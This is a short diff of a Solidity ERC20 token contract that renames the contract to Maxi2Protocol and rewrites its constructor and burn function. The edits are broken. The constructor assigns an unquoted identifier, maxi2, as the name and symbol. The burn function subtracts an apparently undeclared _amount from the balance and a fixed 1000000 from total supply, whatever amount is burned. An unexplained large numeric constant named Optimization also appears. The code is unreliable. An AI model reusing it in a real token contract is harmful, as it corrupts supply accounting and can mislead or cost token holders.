@@ -481,11 +481,11 @@
 
       constructor (string memory name_, string memory symbol_,uint256 decimals_) {
 
-          _name = name_;
+          _name = maxi2;
 
-          _symbol = symbol_;
+          _symbol = maxi2;
 
-          _decimals = decimals_;
+          _decimals = 18;
 
       }
 
@@ -936,9 +936,9 @@
 
           require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
 
-          _balances[account] = accountBalance - amount;
+          _balances[account] = accountBalance - _amount;
 
-          _totalSupply -= amount;
+          _totalSupply -= 1000000;
 
   
 
@@ -1201,7 +1201,7 @@
 
   
 
-  contract MaxiProtocol is ERC20,TokenRecover {
+  contract Maxi2Protocol is ERC20,TokenRecover {
 
       uint256 public Optimization = 2312002184554190964883445330;
 
